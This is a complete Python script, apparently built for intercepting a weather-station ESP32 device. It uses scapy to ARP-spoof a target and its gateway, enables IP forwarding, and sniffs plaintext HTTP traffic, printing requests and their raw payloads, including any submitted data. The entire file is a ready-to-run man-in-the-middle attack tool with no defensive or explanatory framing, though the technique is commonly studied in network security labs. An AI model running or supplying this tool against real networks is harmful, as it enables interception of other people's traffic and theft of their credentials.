#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse
import sys
import time

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    # Tylko dla Linuxa
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception as e:
        print(f"[-] Could not enable IP forwarding: {e}")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC address for target {target_ip}")
        return
    
    # Tworzymy pakiet ARP Response (is-at). 
    # Mówimy ofierze (target_ip), że my (nasz MAC) mamy IP bramy (spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # Przywracamy prawdziwe mapowanie w tablicy ARP
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(f"\n[+] HTTP Request from {packet[scapy.IP].src}")
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"    URL: {url}")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            print(f"    Data: {load}")

def sniff_packets(interface):
    print(f"[*] Sniffing on interface {interface}...")
    # store=False, żeby nie zapychać RAMu
    scapy.sniff(iface=interface, store=False, prn=process_packet, filter="port 80")

def main():
    parser = argparse.ArgumentParser(description="Weather Station Interceptor (ARP Spoofing + HTTP Sniffing)")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target ESP32 IP", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway (Router) IP", required=True)
    parser.add_argument("-i", "--interface", dest="interface", help="Network Interface (e.g. wlan0, eth0)", default="wlan0")
    options = parser.parse_args()

    enable_ip_forwarding()

    try:
        sent_packets_count = 0
        print(f"[*] Starting ARP Spoofing against {options.target_ip}...")
        
        # Uruchamiamy spoofing w osobnym wątku
        stop_spoofing = False
        
        def spoof_loop():
            nonlocal sent_packets_count
            while not stop_spoofing:
                spoof(options.target_ip, options.gateway_ip)
                spoof(options.gateway_ip, options.target_ip)
                sent_packets_count += 2
                # print(f"\r[+] Packets sent: {sent_packets_count}", end="") # Może kolidować z outputem sniffingu
                time.sleep(2)

        import threading
        spoof_thread = threading.Thread(target=spoof_loop)
        spoof_thread.daemon = True
        spoof_thread.start()
        
        # Uruchamiamy sniffing w głównym wątku
        print("[*] Spoofing running in background. Starting Sniffer...")
        print("[*] Press Ctrl+C to stop.")
        sniff_packets(options.interface)
            
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Restoring ARP tables...")
        stop_spoofing = True
        restore(options.target_ip, options.gateway_ip)
        restore(options.gateway_ip, options.target_ip)
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()
